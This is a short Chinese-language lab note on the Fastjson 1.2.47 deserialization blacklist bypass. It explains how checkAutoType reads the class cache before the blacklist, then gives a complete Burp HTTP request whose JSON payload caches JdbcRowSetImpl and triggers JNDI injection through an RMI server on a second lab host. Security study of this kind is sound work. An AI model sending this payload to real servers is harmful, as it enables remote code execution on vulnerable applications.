1.2.47和1.2.24最大的区别是增加了黑名单机制，Fastjson 在反序列化时，会调用`checkAutoType()` 方法来检查 `@type` 指定的类是否合法。在 1.2.47 中，该方法的执行顺序存在一个关键缺陷：
- **先查缓存**：代码会首先调用 `TypeUtils.getClassFromMapping(typeName)` 尝试从全局缓存 `mappings` 中获取类。
- **后查黑名单**：只有在缓存中未命中时，才会继续执行黑名单校验。
这意味着，**只要能让一个恶意类提前进入 `mappings` 缓存，后续引用它时就会直接返回，永远不会触发黑名单检测**。而 `java.lang.Class` 这个 JDK 基础类，恰好允许通过其 `val` 属性触发 `Class.forName()`，将任意类加载并缓存。
具体利用步骤如1.2.24一样，只是通过Burp对RMI发送请求时需修改请求包
```
POST / HTTP/1.1
Host: 192.168.68.46:8090
Content-Type: application/json
Content-Length: 223

{
"a":{
"@type":"java.lang.Class",
"val":"com.sun.rowset.JdbcRowSetImpl"
},
"b":{"@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://192.168.139.3:9999/TouchFile",
        "autoCommit":true
}
}
```
- **字段 `a`（写入缓存）**：`java.lang.Class` 不在黑名单中，会被直接放行。Fastjson 在反序列化它时，会读取 `val` 的值，在内部调用 `Class.forName("com.sun.rowset.JdbcRowSetImpl")`，并将这个 Class 对象存入 `mappings` 缓存。
- **字段 `b`（利用缓存）**：当解析到 `com.sun.rowset.JdbcRowSetImpl` 时，`checkAutoType` 首先在缓存中查找，发现它已被字段 `a` 存入，于是**直接返回，不再执行黑名单检查**。随后，Fastjson 会实例化该类，并调用其 `setDataSourceName` 和 `setAutoCommit`，触发 JNDI 注入。
![[Fastjson 1.2.47-20260911.png]]